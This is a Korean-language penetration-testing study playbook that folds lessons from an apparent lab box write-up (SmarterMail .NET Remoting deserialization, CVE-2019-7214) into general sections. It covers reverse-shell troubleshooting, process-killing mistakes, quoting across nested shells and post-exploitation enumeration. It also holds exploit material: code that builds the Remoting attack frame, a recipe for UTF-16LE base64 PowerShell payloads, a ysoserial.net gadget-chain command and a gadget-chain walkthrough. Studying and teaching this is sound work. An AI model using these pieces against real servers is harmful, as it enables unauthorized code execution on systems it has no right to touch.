> > 4. **페이로드 자체가 안 터졌다** — 이 박스라면 1360 초과를 의심
> > 5. **바인드셸로 전환** — 아웃바운드가 완전히 막혔다면 역방향을 포기

⚠️ 원문의 `| tee ~/PG/Algernon/shell_session.log` 는 **검증되지 않음** — `shell_session.log` 가 정확히 80칼럼에서 접혀 있어 `tmux capture-pane` 회수로 보임 `[가정]`. 그리고 A-31 은 이미 「리스너를 `tee` 로 감싸지 말 것」을 명시하고 있으므로, 이관 본문에서는 `tee` 를 뺐음.

---

## 10. A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f` — **병합**

**넣을 본문 (「`pkill -f` 는 «자기 자신»을 죽임」 문단 아래)**

**`sudo pkill -f 'nc -lvnp'` 한 줄이 tmux 서버를 통째로 죽임 — 무관한 다른 박스의 세션까지.** [[Algernon]] — 잘못 만든 리스너를 정리하려고 패턴 kill 을 썼더니 리스너뿐 아니라 tmux 서버가 내려가, 진행 중이던 nmap 세션과 **완전히 무관한 다른 박스의 작업 세션까지 함께 죽었음.** `pkill -f` 는 전체 커맨드라인에 정규식을 맞추는데 tmux 가 페인 프로세스를 띄울 때의 커맨드라인에도 `nc -lvnp` 문자열이 들어가 tmux 관리 프로세스가 광범위하게 매치된 것 `[가정]`. `sudo` 까지 붙어 소유자 제한도 없었음.
```bash
# ✓ 포트를 정확히 지정해 그 리스너만
sudo fuser -k 80/tcp
# ✓ 또는 PID 를 먼저 확인하고 그것만
ss -lntp | grep ':80 '
sudo kill <PID>
# ✓ tmux 는 세션 «이름»으로만 (다른 세션은 안 건드림)
tmux kill-session -t alg80
```
→ **랩에서는 내 작업만 날아가지만 실무 침투 테스트에서 고객 서버에 치면 사고 보고서를 쓰게 됨.** 패턴으로 죽여야 한다면 먼저 `pgrep -af '<패턴>'` 으로 무엇이 매치되는지 눈으로 볼 것.

**지우기 전 원문**

> ### ② `sudo pkill -f 'nc -lvnp'` 가 tmux 서버 전체를 죽임
> **무엇을 했는가.** 잘못 만든 리스너를 정리하려고 패턴 kill 사용.
> ```bash
> # ✗ 이 명령이 사고를 냈다
> sudo pkill -f 'nc -lvnp'
> ```
> **무엇이 일어났는가.** 리스너뿐 아니라 tmux 서버가 통째로 내려감. 진행 중이던 nmap 세션과, 완전히 무관한 다른 박스의 작업 세션까지 함께 죽음.
> **왜 그렇게 됐는가.** `pkill -f`는 전체 커맨드라인에 정규식을 맞춤. tmux가 pane 프로세스를 띄울 때의 커맨드라인에도 `nc -lvnp` 문자열이 들어가므로 tmux가 관리하는 프로세스들이 광범위하게 매치됨 `[가정]`. `sudo`까지 붙어 있어 소유자 제한도 없었음.
> **해결 — 대상을 좁힘.**
> ```bash
> # ✓ 포트를 정확히 지정해 그 리스너만
> sudo fuser -k 80/tcp
> # ✓ 또는 PID를 먼저 확인하고 그것만
> ss -lntp | grep ':80 '
> sudo kill <PID>
> # ✓ tmux 세션 단위로 정리 (다른 세션은 건드리지 않는다)
> tmux kill-session -t alg80
> ```
> > [!danger] `pkill -f` 는 실전에서 쓰지 마라
> > 특히 `sudo`와 함께는 더욱. 랩에서는 내 작업만 날아가지만, **실무 침투 테스트에서 이걸 고객 서버에 치면 사고 보고서를 쓰게 됨.**
> > 규칙 — **kill은 PID로.** 패턴으로 죽여야 한다면 먼저 `pgrep -af '<패턴>'`으로 무엇이 매치되는지 눈으로 확인할 것.

---

## 11. B-84. 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다 — **병합**

**넣을 본문**

**5중 경유에서 중첩 따옴표 + 셸 문법 혼입이 «동시에» 깨짐 — 에러도 없이.** [[Algernon]] 리버스셸 안에서:
```text
PS C:\Windows\system32> cmd /c "dir C:\ /s /b 2>/dev/null | findstr /i \"proof.t
xt local.txt\""
PS C:\Windows\system32>
```
— 출처: `~/PG/Algernon/shell_session.log`

출력 0줄, 에러도 없음. 둘이 동시에 망가졌음:
1. **`2>nul`(Windows)이 `2>/dev/null`(sh)로 변형됨.** Windows 에서 `/dev/null` 은 경로로 해석돼 리다이렉트가 실패함
2. **중첩 따옴표 붕괴.** `SSH → tmux send-keys → nc 소켓 → PowerShell iex → cmd.exe` 5중 경유라 각 계층이 백슬래시·큰따옴표를 자기 방식으로 소비함

**어떻게 알아챘는가 — `dir C:\ /s /b` 는 어떤 상황에서도 수만 줄을 뱉음.** 출력이 0줄이라는 것은 「찾는 파일이 없다」가 아니라 **「명령 자체가 실행되지 않았다」**임. 결과가 「없음」일 때는 명령이 정말 돌았는지부터 의심할 것.

**해결 — 경유를 하나 줄이고 중첩 따옴표를 없앰:**
```powershell
Get-ChildItem C:\Users -Directory | Select-Object -Expand Name
Get-ChildItem C:\Users\dean\Desktop, C:\Users\Administrator\Desktop -Force -ErrorAction SilentlyContinue | Select-Object FullName
```
- `cmd /c` 를 없애 경유 계층 5→4
- **중첩 따옴표가 아예 없음** — 경로를 쉼표로 나열하고 파이프 대신 cmdlet 파라미터를 씀
- `2>nul` 대신 `-ErrorAction SilentlyContinue` — PowerShell 고유 문법이라 리눅스 문법과 섞일 여지가 없음

→ **경유 계층이 3개를 넘으면:** ①중첩 따옴표를 쓰지 말 것(쉼표 나열·배열·cmdlet 파라미터) ②셸 문법을 섞지 말 것(PowerShell 이면 `2>nul` 도 `2>/dev/null` 도 안 씀) ③정 복잡하면 `powershell -enc <base64>`(B-81) ④또는 스크립트를 파일로 뺄 것 ⑤**결과가 비었으면 반드시 출력이 나오는 명령(`whoami`)을 같은 방식으로 한 번 쳐서 「명령이 실행됐는가」부터 검증할 것.**

**지우기 전 원문** — 노트 §6-③ 전량(위 본문이 그 내용을 그대로 옮긴 것). 원문의 「어떻게 알아챘는가」 단락과 5단계 일반화 tip 을 한 글자도 빼지 않았음.

---

## 12. B-81. 페이로드는 base64로 감싼다 — **병합**

**넣을 본문**

**Windows 판 — `powershell.exe -EncodedCommand` 는 UTF-16LE 를 요구함.** Windows 의 네이티브 문자열 표현이 UTF-16LE 라, `-EncodedCommand` 는 base64 를 디코드한 결과를 그대로 `wchar_t*` 로 취급함. **UTF-8 을 넣으면 각 ASCII 바이트가 절반씩 잘못 짝지어져 한자·기호 범벅이 되고 파서가 죽음.**
```python
psh_shell = psh_shell.encode('utf-16')[2:]   # Python 의 utf-16 코덱은 BOM \xff\xfe 를 붙임 → [2:] 로 잘라 순수 UTF-16LE
psh_shell = base64.b64encode(psh_shell)
```
손으로 만들 때:
```bash
echo -n '<명령>' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```
```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('<명령>'))
# ↑ .NET 의 Encoding.Unicode 가 UTF-16LE 임. Encoding.UTF8 이 아님
```
⚠️ **`-w0` 를 빼면 실패함.** GNU `base64` 는 기본적으로 76자마다 줄바꿈을 넣고, 그 개행이 명령줄에 들어가면 인자가 쪼개짐. **선택이 아니라 필수**([[Squid]] 의 `-enc` 사용 사례와 동일).

**`-enc` 를 쓰는 진짜 이유는 탐지 회피가 아니라 «인용부호 붕괴 회피»임.** [[Algernon]] 의 페이로드는 `Python 문자열 → base64 직렬화 스트림 → cmd.exe 명령줄 → powershell.exe 인자` 라는 **4중 경유**를 거침. 원라이너에 `"`·`$`·`|`·`&`·`>` 가 전부 들어 있어 그대로는 어느 계층에서든 반드시 깨짐. base64 는 `A-Za-z0-9+/=` 뿐이라 어느 셸에서도 특수문자가 없음.
→ 누적 패턴 「인용이 깨지면 인코딩으로 도망간다」 — [[Hawat]] hex · [[Exfiltrated]] base64 · [[Squid]] hex + `-enc` + 배치 래핑 · **[[Algernon]] base64 + UTF-16LE**.
⚠️ **`-enc` 는 AMSI 를 우회하지 못함**(A-35). 인용 회피용이지 탐지 회피용이 아님.

**지우기 전 원문** — 노트 §2-8 전량. 위 본문이 그 내용(설명·수동 생성법 3종·`-w0` 경고·`-enc` 의 진짜 이유·누적 패턴)을 전부 옮긴 것.

---

## 13. B-44. unquoted service path — 그리고 `StartName` — **병합**

**넣을 본문 (`StartName` 을 같이 찍으라는 문단 아래)**

**`StartName` 이 권한상승의 «유무»를 결정함 — 익스플로잇 «전»에 알 수 있음.** [[Algernon]] 은 셸을 잡자마자 친 한 줄로 권한상승 장이 통째로 사라졌음:
```text
Name      : MailService
StartName : LocalSystem
State     : Running
PathName  : "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService
.exe"
```
— 출처: `~/PG/Algernon/shell_session.log`

| `StartName` | 익스플로잇하면 무엇을 얻는가 | 다음 수 |
|---|---|---|
| `LocalSystem` | `NT AUTHORITY\SYSTEM` | 끝. 권한상승 불필요 |
| `NT AUTHORITY\LocalService` | `LOCAL SERVICE` — 특권이 «박탈된» 상태 | FullPowers 로 복원 → PrintSpoofer/Potato(B-42 · B-46) |
| `NT AUTHORITY\NetworkService` | `NETWORK SERVICE` | 동일. `SeImpersonatePrivilege` 확인 |
| `IIS APPPOOL\<pool>` | 앱풀 아이덴티티 | 동일. `whoami /priv` |
| 도메인/로컬 사용자 계정 | 그 사용자 | 서비스 계정의 평문 비밀번호가 레지스트리에 있을 수 있음 |

→ **서비스 취약점을 찌르기 «전»에 그 서비스의 `StartName` 을 확인하면 「셸을 잡으면 무엇이 되는가」를 미리 앎.** B-1-40(관리 화면이 렌더한 «경로»가 실행 계정을 말해준다)의 서비스 판임.
→ `PathName` 이 따옴표로 감싸져 있으면 unquoted 벡터는 애초에 해당 없음 — [[Algernon]] 이 그 예임.

**지우기 전 원문** — 노트 §4-2 표 전량(위 표가 그대로임) + 아래.

> **`StartName : LocalSystem` 한 줄이 이 박스의 4장(권한상승)을 통째로 삭제함.**
> Windows 서비스는 실행 계정을 반드시 하나 가짐. **그 계정이 곧 익스플로잇 성공 시 얻는 권한.**

⚠️ 표 자체는 **노트에도 남겼음**(권한상승이 없는 이유를 심사관이 납득하는 데 필요). 이관은 일반화 문단 쪽임.

---

## 14. C-2. 셸 직후 — **병합**

**넣을 본문 (Windows 판 5개 명령 블록 아래)**

**첫 명령은 언제나 `whoami` — 그 한 줄로 권한상승 장이 통째로 사라질 수 있음.** [[Algernon]] 은 리버스셸이 붙자마자 친 `whoami` 가 `nt authority\system` 이었고 그 시점에서 남은 일이 플래그 읽기뿐이었음. **그런데도 열거를 먼저 시작해 30분을 태우는 일이 흔함.**
서비스 익스플로잇으로 잡은 셸이면 다섯 개를 이 순서로:
```powershell
whoami                                       # ① 나는 누구인가 ← SYSTEM 이면 여기서 끝
whoami /priv                                 # ② SeImpersonate / SeBackup / SeDebug 가 있는가
whoami /groups                               # ③ Administrators 멤버인가
systeminfo                                   # ④ OS 빌드·핫픽스 (커널 익스플로잇 판단)
Get-CimInstance Win32_Service | Select Name,StartName,State,PathName   # ⑤ 서비스 계정과 경로
```
리눅스의 `id`·`sudo -l`·`find / -perm -4000`·`getcap -r /`·`crontab -l` 에 대응하는 세트임 — **리눅스 반사는 여기서 전부 무용지물.**

**지우기 전 원문**

> > [!tip] 시험 반사 — Windows 셸을 잡으면 무조건 이 5개부터
> > 리눅스의 `id` · `sudo -l` · `find / -perm -4000` · `getcap -r /` · `crontab -l` 에 대응하는 Windows 세트.
> > ```powershell
> > whoami                                       # 1. 나는 누구인가 ← SYSTEM 이면 여기서 끝
> > whoami /priv                                 # 2. SeImpersonate / SeBackup / SeDebug 가 있는가
> > whoami /groups                               # 3. Administrators 멤버인가
> > systeminfo                                   # 4. OS 빌드·핫픽스 (커널 익스플로잇 판단)
> > Get-CimInstance Win32_Service | Select Name,StartName,State,PathName   # 5. 서비스 계정과 경로
> > ```
> > `whoami` 하나로 4장이 통째로 사라질 수 있음. 그런데도 열거를 먼저 시작해 30분을 태우는 일이 흔함. **첫 명령은 항상 `whoami`.**

---

## 15. C-3. 플래그·증거 — **병합**

**넣을 본문**

**플래그가 안 보이면 「없다」가 답일 수 있음 — 전역 재귀 검색은 그 다음임.** [[Algernon]] 은 `proof.txt` 만 있고 `local.txt` 가 **애초에 배치되지 않은** 단일 플래그 박스였음. 「숨겨져 있겠지」 하고 `Get-ChildItem C:\ -Recurse -Filter local.txt` 를 돌리기 시작하면 수 분~수십 분이 날아가고, 그 명령이 조용히 깨지면 「돌았는데 없다」와 「안 돌았다」를 구분할 수도 없음(B-84).

순서:
1. **`-Force`/`dir /a`** 를 썼는가 — PG 플래그 파일은 **숨김 속성**인 경우가 있고 `Get-ChildItem`/`dir` 은 기본적으로 숨김을 안 보여줌
2. **`C:\Users` 를 먼저 나열해 «실제 사람 계정»을 확정** — `.NET v4.5`·`DefaultAppPool` 같은 앱풀 프로필과 `Public` 을 걸러냄
3. 각 계정의 Desktop 을 `-Force -ErrorAction SilentlyContinue` 로 전수 조회. `-ErrorAction` 은 접근 거부 항목에서 멈추지 않기 위한 것 — **SYSTEM 이라도 일부 항목에서 에러가 나고 그때 멈추면 결과가 잘림**
4. `C:\Users\Public` · `C:\` · `%USERPROFILE%\Documents` 도 후보
5. **여기까지 실패한 뒤에야** 전역 재귀 검색
6. **그래도 없으면 「없다」가 답일 수 있음** — SYSTEM 인데 안 보이면 정말로 없는 것이지 권한 문제가 아님

[[Algernon]] 은 2·3 두 단계로 결론이 났고 전역 검색을 하지 않았음. [[Squid]] 도 「플래그가 표준 위치에 없었다 + `-Recurse` 함정」으로 같은 곳에서 막혔음.

**지우기 전 원문**

> ### ⑦ `local.txt`를 찾느라 시간을 태울 뻔함
> SYSTEM을 잡은 직후 `proof.txt`는 바로 나옴. 그런데 **`local.txt`가 없었음.** PG 박스는 보통 2개.
> **함정.** "숨겨져 있겠지" 하고 `Get-ChildItem C:\ -Recurse -Filter local.txt`를 돌리기 시작하면 수 분에서 수십 분이 날아감. 그리고 ③의 사고처럼 명령이 조용히 깨지면 "돌았는데 없다"와 "안 돌았다"를 구분할 수도 없음.
> **올바른 절차.** 전역 재귀 검색 이전에 표준 위치를 전수 확인.
> ```powershell
> Get-ChildItem C:\Users -Directory | Select-Object -Expand Name          # 1) 사용자 목록 확정
> Get-ChildItem C:\Users\<각 사용자>\Desktop -Force -ErrorAction SilentlyContinue  # 2) Desktop 전수, -Force 필수
> ```
> 두 단계로 **`local.txt`가 배치되지 않았다**는 결론이 나옴. 이 박스는 단일 플래그 박스.
> > [!warning] `-Force` 없이 조회했다면 오판했을 것
> > PG의 플래그 파일은 **숨김 속성이 붙어 있는 경우가 있음.** `Get-ChildItem`/`dir`은 기본적으로 숨김 파일을 보여주지 않음.
> > - PowerShell: `Get-ChildItem -Force`
> > - cmd: `dir /a`
> > `-ErrorAction SilentlyContinue`는 접근 거부 항목에서 멈추지 않고 계속 훑기 위한 것. **SYSTEM이라도 일부 항목에서 에러가 날 수 있고, 그때 스크립트 전체가 멈추면 결과가 잘림.**
> > [!tip] 시험 반사 — 플래그가 안 보이면
> > 1. **`-Force`/`dir /a`** 를 썼는가 (숨김 속성)
> > 2. **모든 사용자 프로필**을 봤는가 — `C:\Users` 나열부터
> > 3. `C:\Users\Public`, `C:\`, `%USERPROFILE%\Documents` 도 후보
> > 4. **여기까지 실패한 뒤에야** 전역 재귀 검색
> > 5. **그래도 없으면 "없다"가 답일 수 있음.** SYSTEM인데 안 보이면 정말로 없는 것 — 권한 문제가 아님
> > [[Squid]]도 "플래그가 표준 위치에 없었다 + `-Recurse` 함정"으로 같은 곳에서 막힘.

---

## 16. D. 시간 배분 · 손절 기준 — **병합**

**넣을 본문**

**[[Algernon]] — 성공 경로 약 9분(10:59:00 빠른 스캔 → 11:08 플래그), 태운 시간의 대부분은 인프라 실수를 알아채는 데 들어감.**

| 구간 | 실제 | 손절선 |
|---|---|---|
| 빠른 스캔(10:59:00 → 10:59:01) | 1.3초 | — |
| 전수 스캔(`-p-`, 208초) | 3.5분 | 백그라운드로 돌리고 기다리지 않음. **익스플로잇이 전수 스캔이 끝나기 전에 완료됨** |
| 제품·버전 식별(9998) | 약 2분 | 10분. 넘어가면 다른 포트로 |
| 익스플로잇 확보·수정(`searchsploit` → diff) | 약 1분 | 15분 |
| 리스너 준비 + 발사 + 셸 | 약 5분 | 20분. 넘으면 원인 격리 절차(A-12)로 |
| 플래그 확인 | 약 3분 | 10분. `local.txt` 전역 검색은 하지 않음(C-3) |
| 합계 | 약 10분 | 1시간 |

원칙 셋:
1. **전수 스캔을 기다리지 말 것.** 빠른 스캔(1.3초)으로 나온 포트에서 즉시 작업을 시작하고 `-p-` 는 백그라운드에. 이 박스는 실제로 전수 스캔이 끝나기 전에 SYSTEM 을 잡았음
2. **버전이 확정된 «다음»에 익스플로잇을 찾을 것.** 순서를 뒤집으면 「익스플로잇에 맞는 버전을 찾는」 확증 편향에 빠짐(A-13)
3. **인프라 준비에 5분 이상 쓰고 있으면 뭔가 잘못된 것.** 리스너 하나 띄우는 데 시간이 걸린다면 도구 문제가 아니라 절차 문제임(A-31 · A-33)

⚠️ 위 구간 시각은 산출물 mtime 과 nmap 로그 타임스탬프로 재구성한 것이고(`nmap_quick.log` 10:59:01 · `nmap.log` 11:05:40 · `nmap_lowrate_crosscheck.log` 11:08:08 · `shell_session.log`·스크린샷 11:08:50), **개별 구간의 「약 N분」은 원 노트의 자기 신고 값임**(A-64).

**지우기 전 원문** — 노트 §6-⑨ 표와 tip 전량(위가 그것을 옮긴 것). 원문의 「합계 약 10분 / 손절선 1시간」을 그대로 유지했음.

---

## 17. E. OSCP 시험 규정 — **병합**

**넣을 본문 (「Metasploit 대안이 있어도 일부러 안 쓰는 판단」 목록에 추가)**

- [[Algernon]] — `exploit/windows/http/smartermail_rce`(Rank `ExcellentRanking`, Kali 설치본에서 확인)와 `post/windows/gather/credentials/smartermail` 이 둘 다 실재하나 **1대 한정 카드를 쓰지 않고** EDB 49216 로 감. 판정 근거는 **프레임워크 의존성이 있는가** — 49216 은 순수 Python + 표준 라이브러리(`base64`·`socket`·`struct`)뿐이고, 단일 CVE 의 독립 PoC 이므로 「자동 익스플로잇 도구」에 해당하지 않아 허용됨. 두 경로의 결과가 어차피 동일하게 SYSTEM 이므로 **결과가 같은데 제한된 카드를 태우는 것은 순수한 손해**임
  - 스크립트조차 없을 때의 완전 수동 대안은 `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell -enc <UTF16LE-base64>"` 로 체인을 만들고 EDB 49216 의 프레임 조립부(`.NET` 매직 + 길이 + `tcp://<타겟>:17001/Servers` URI)에 `payload` 변수만 갈아끼우는 것임

**지우기 전 원문**

> ### 3-6. ⚠️ Metasploit 대안 — 존재하지만 쓰지 않음
> ```text
> exploit/windows/http/smartermail_rce                     (Rank: excellent)
> post/windows/gather/credentials/smartermail
> ```
> > [!danger] ⚠️ 시험 금지 — Metasploit은 단 1대에만 허용
> > OSCP 시험 규정상 Metasploit 익스플로잇 모듈/`meterpreter`/`post` 모듈은 **시험 전체를 통틀어 단 한 대의 타겟**에만 쓸 수 있음. (`msfvenom`으로 페이로드를 만드는 것과 `multi/handler`로 받는 것은 이 제한에 포함되지 않음.)
> > **판단 과정:**
> > 1. EDB 49216은 **순수 Python + 표준 라이브러리(`base64`·`socket`·`struct`)** 뿐. Metasploit 프레임워크에 전혀 의존하지 않음
> > 2. **단일 CVE의 독립 PoC**이므로 "자동 익스플로잇 도구"에 해당하지 않음 → OSCP 허용
> > 3. 두 경로의 **결과가 동일** — 어느 쪽이든 `MailService`가 `LocalSystem`이므로 곧바로 SYSTEM
> > 4. 결과가 같은데 **제한된 카드를 여기서 태울 이유가 없음.** Metasploit 1회는 정말로 수동 익스플로잇이 안 되는 박스를 위해 남겨둠
> > **결론 — 이 박스에서 Metasploit을 쓰는 것은 순수한 손해.**

---

## 18. **신규** — B-2(네트워크 서비스) — .NET Remoting 은 그 자체로 무인증 역직렬화 엔드포인트다

**어느 절** — `B-2. 네트워크 서비스`. 번호는 기록자가 배정. `_PLAYBOOK` 전체에 `Remoting` 문자열이 **0건**이라 기존 항목 없음(역검색 확인).

**넣을 본문**

**신호** — `nmap -sV` 가 `remoting MS .NET Remoting services` 라고 적음(기본 포트 예: SmarterMail 17001). 웹 포트가 아니라 **바이너리 RPC 포트가 진짜 입구**인 부류임.

**왜 그 자체로 취약점 후보인가**
- .NET Remoting 은 .NET Framework 1.0~2.0 시대의 원격 객체 호출 프레임워크(자바 RMI·CORBA 와 같은 계보). 서버가 객체를 URI 로 등록(`tcp://host:17001/Servers`)하고, 클라이언트가 로컬 객체처럼 메서드를 부르면 프레임워크가 인자를 직렬화해 TCP 로 보내고 서버가 역직렬화해 실제 메서드를 호출함
- **「인자를 역직렬화」하는 부분이 기본적으로 `BinaryFormatter`** — 즉 TCP 채널이 설계상 원격 역직렬화 엔드포인트임
- **인증이 선택 사항** — 기본 구성에서 TCP 채널은 누구나 연결해 객체를 보낼 수 있음
- **역직렬화가 메서드 호출 «전»에 일어남** — 인증 로직이 있어도 소용없음. 인자를 풀어야 인증 메서드를 부를 수 있으므로 인증 전에 이미 코드가 실행됨
- `typeFilterLevel` 이 `Low` 면 델리게이트 계열 가젯이 차단되지만 `Full` 로 올려놓은 애플리케이션이 흔함. SmarterMail 이 그랬음 `[가정]` — 근거는 「페이로드가 델리게이트 가젯을 쓰는데 성공했다」는 사실
- Microsoft 가 2010년대 초 사용 중단을 권고했고 .NET Core 는 아예 지원하지 않으나, **레거시 제품에는 그대로 남아 있음**

**반사 순서**
1. 어떤 제품이 이 포트를 열었는가 — 다른 포트의 웹 UI·배너에서 제품명 확보
2. `searchsploit <제품명>` — 역직렬화 익스플로잇이 있는가
3. 없으면 `ysoserial.net`(가젯 생성) + `ExploitRemotingService`(James Forshaw) 조합을 직접 시도

**전송 계층 — HTTP 가 아님.** 프레임은 `.NET` 매직 4바이트로 시작함:
```python
msg  = b'.NET'                 # Header
msg += b'\x01' + b'\x00'       # Version Major / Minor
msg += b'\x00\x00'             # Operation Type
msg += b'\x00\x00'             # Content Distribution
msg += pack('I', len(payload)) # Data Length (리틀엔디언 4바이트)
msg += b'\x04\x00'             # URI Header
msg += b'\x01' + b'\x01'       # Data Type / Encoding = UTF8
msg += pack('I', len(uri))     # URI Length
msg += uri                     # tcp://<타겟>:17001/Servers
msg += b'\x00\x00'             # Terminating Header
msg += payload                 # 직렬화 데이터
```
— 출처: `~/PG/Algernon/exploit_algernon.py`(EDB 49216)

- **같은 바이트를 웹 포트로 보내면 IIS 가 `400 Bad Request - Invalid Verb` 를 뱉음.** 「익스플로잇이 안 먹힌다」로 오판하는 지점임
- URI 의 마지막 조각(`/Servers`)이 등록된 원격 객체 이름이라 제품마다 다름. SmarterMail 은 `/Servers`·`/Mail`·`/Spool` 셋을 노출함(출처: msf `smartermail_rce.rb` 모듈 설명)
- `struct.pack('I', n)` 은 **호스트 바이트 순서**라 x86/x64 에서 리틀엔디언임. 엄밀히는 `'<I'` 가 정확하나 Kali(x86_64)에서 돌리는 한 결과가 같음

**같은 반사가 필요한 다른 신호** — 8009 AJP(Ghostcat) · 1099 Java RMI · 4848 GlassFish · ViewState 가 붙은 ASP.NET 폼 · Telerik `Telerik.Web.UI.WebResource.axd`.
⚠️ **Telerik 역직렬화는 이 박스의 취약점이 «아님».** 비교 사례로만 언급할 것 — [[Algernon]] 노트에 그 CVE 번호가 한때 잘못 붙어 색인이 오염된 이력이 있음([[_WRITEUP-STANDARD]] `manual_cves` 절).

**출처** — [[Algernon]](SmarterMail 17001, CVE-2019-7214).

**지우기 전 원문** — 노트 §2-3 전량 + §2-6 전량 + §2-4 일부.

> ### 2-3. 배경 ③ — .NET Remoting은 무엇이고 왜 위험한가
> **.NET Remoting**은 .NET Framework 1.0~2.0 시대의 원격 객체 호출 프레임워크. 자바의 RMI, 코바(CORBA)와 같은 계보.
> 동작 방식:
> - 서버가 객체를 URI로 등록 (`tcp://host:17001/Servers`)
> - 클라이언트는 로컬 객체처럼 메서드를 호출
> - 프레임워크가 인자를 직렬화해서 TCP로 보내고, 서버가 역직렬화해서 실제 메서드를 호출
> **여기서 문제가 자명해짐** — "인자를 역직렬화"하는 부분이 기본적으로 `BinaryFormatter`. 즉 .NET Remoting의 TCP 채널은 설계상 원격 역직렬화 엔드포인트.
> | 왜 이게 그렇게 나쁜가 | 설명 |
> |---|---|
> | 인증이 선택 사항 | 기본 구성에서 TCP 채널은 누구나 연결해 객체를 보낼 수 있음 |
> | `typeFilterLevel` 기본값 | `Low`면 델리게이트 계열이 차단되지만, `Full`로 올려놓는 애플리케이션이 흔함. SmarterMail이 그랬음 `[가정]` — 페이로드가 델리게이트 가젯을 쓰는데 성공했다는 사실이 근거 |
> | **역직렬화가 메서드 호출 *전에* 일어남 | 인증 로직이 있어도 소용없음. 인자를 풀어야 인증 메서드를 호출할 수 있으므로, 인증 전에 이미 코드가 실행됨** |
> | 폐기됐지만 살아 있음 | Microsoft는 2010년대 초 사용 중단을 권고했고 .NET Core는 아예 지원하지 않음. 그러나 레거시 제품에는 그대로 남아 있음 |
> > [!danger] 시험 반사 — `nmap`이 `remoting` 이라고 하면
> > **`.NET Remoting` 은 그 자체로 취약점 후보.** 포트를 보자마자 다음을 확인할 것:
> > 1. 어떤 제품이 이 포트를 열었는가 (다른 포트의 웹 UI·배너에서 제품명 확보)
> > 2. `searchsploit <제품명>` — 역직렬화 익스플로잇이 있는가
> > 3. 없다면 `ysoserial.net` + `ExploitRemotingService` 조합을 직접 시도
> > 같은 반사가 필요한 다른 신호들: 8009 AJP(Ghostcat), 1099 Java RMI, 4848 GlassFish, ViewState가 붙은 ASP.NET 폼, Telerik `Telerik.Web.UI.WebResource.axd`.
>
> ### 2-6. 프레임 해부 — .NET Remoting TCP 와이어 포맷
> (익스플로잇의 `msg` 조립 코드 전문 + 필드 표 4행 + `pack('I', ...)` 설명)
> | `.NET` | 매직 | HTTP가 아님. 9998로 쏘면 IIS가 `400 Invalid Verb`를 뱉는 이유 |
> | Data Length | `pack('I', ...)` | 리틀엔디언 4바이트. 페이로드 길이를 서버가 여기서 읽음 |
> | URI | `tcp://192.168.248.65:17001/Servers` | `/Servers`가 등록된 원격 객체 이름. SmarterMail 고유값 |
> | Terminating Header | `\x00\x00` | 헤더 끝 표시. 이후가 전부 직렬화 데이터 |
> #### `pack('I', ...)` 를 왜 쓰는가
> `struct.pack('I', n)`은 부호 없는 32비트 정수를 **호스트 바이트 순서**로 4바이트로 만듦. x86/x64는 리틀엔디언이므로 결과도 리틀엔디언.
> 엄밀히는 `'<I'`(명시적 리틀엔디언)로 쓰는 것이 정확하나, **Kali(x86_64)에서 돌리는 한 결과가 같음.** 빅엔디언 머신에서 이 스크립트를 돌리면 깨진다는 것만 알아둘 것.

---

## 19. **신규** — B-1(웹) 또는 B-8(페이로드) — `BinaryFormatter` 계열 역직렬화가 왜 RCE 인가

**어느 절** — 기록자 판단. `B-1-44. PHP 객체 역직렬화(PHP Object Injection) + phpggc` 의 **.NET 판**이므로 그 옆에 두는 것이 자연스러움. 다만 전송이 웹이 아닐 수 있어 `B-8` 도 후보임.

**넣을 본문**

**역직렬화는 「데이터를 읽는 행위」가 아니라 「코드를 실행하는 행위」임.** 객체를 복원하려면 런타임이 반드시 ①바이트열에 적힌 **타입 이름**을 읽고 ②그 타입을 어셈블리에서 로드하고 ③인스턴스를 만들어 필드를 채우고 ④**복원 완료 콜백을 호출**해야 함(`OnDeserialization()`·`ISerializable` 생성자·`IDeserializationCallback`, 자바라면 `readObject`/`readResolve`).
**④가 전부임** — 타입 이름을 공격자가 정한다는 것은 「어떤 클래스의 복원 콜백을 실행시킬지 공격자가 고른다」는 뜻임.

**가젯 체인** — 「역직렬화 도중 자동으로 실행되는, 이미 애플리케이션에 존재하는 코드 조각」을 이어 붙인 것. ROP 의 가젯과 개념이 같아 **새 코드를 주입하는 것이 아니라 있는 코드를 엮음.** 그래서 셸코드도, 메모리 손상도, ASLR/DEP 우회도 필요 없고 순수하게 타입 시스템을 남용함. 체인이 표준 라이브러리(`mscorlib`·`System`)에만 있어도 성립하므로 **애플리케이션이 무엇이든 재사용됨** — `ysoserial.net`(닷넷)·`ysoserial`(자바)·`phpggc`(PHP)가 존재하는 이유임.

**위험도는 「타입 이름을 스트림에서 읽는가」로 갈림:**

| 직렬화기 | 타입을 어디서 정하는가 | 위험도 |
|---|---|---|
| `XmlSerializer` | 호출자가 미리 지정(`new XmlSerializer(typeof(Foo))`) | 낮음 |
| `DataContractSerializer` | 호출자 지정 + `KnownTypes` 화이트리스트 | 낮음 |
| `JavaScriptSerializer`(기본) | 호출자 지정 | 낮음 |
| `BinaryFormatter` | **스트림 안에 적힌 대로** | 치명적 |
| `NetDataContractSerializer` · `LosFormatter` · `ObjectStateFormatter` | **스트림 안에 적힌 대로** | 치명적 |

> `BinaryFormatter.Deserialize()` 에 신뢰할 수 없는 바이트를 넣는 것 = **그 바이트를 실행하는 것**과 동등. 예외 없음.

Microsoft 는 이 클래스를 .NET 9 에서 제거했고 그 전에도 「안전하게 만들 수 없다」고 공식 문서에 못박음.

**`TypeConfuseDelegate` 체인이 도는 순서** — [[Algernon]] EDB 49216 이 쓰는 체인. base64 를 디코드하면 타입 이름이 평문으로 보임:
```text
System.Collections.Generic.SortedSet`1[[System.String, mscorlib, ...]]
System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, ...]]
System.DelegateSerializationHolder
System.DelegateSerializationHolder+DelegateEntry
System.Reflection.MemberInfoSerializationHolder
System.Func`3[[System.String, ...],[System.String, ...],[System.Diagnostics.Process, System, ...]]
System.Diagnostics.Process
Start
System.Comparison`1[[System.String, mscorlib, ...]]
Compare
```

| 단계 | 무슨 일이 일어나는가 |
|---|---|
| 1 | `SortedSet<string>` 이 복원됨. `OnDeserialization` 에서 원소를 다시 트리에 삽입하며 정렬함 |
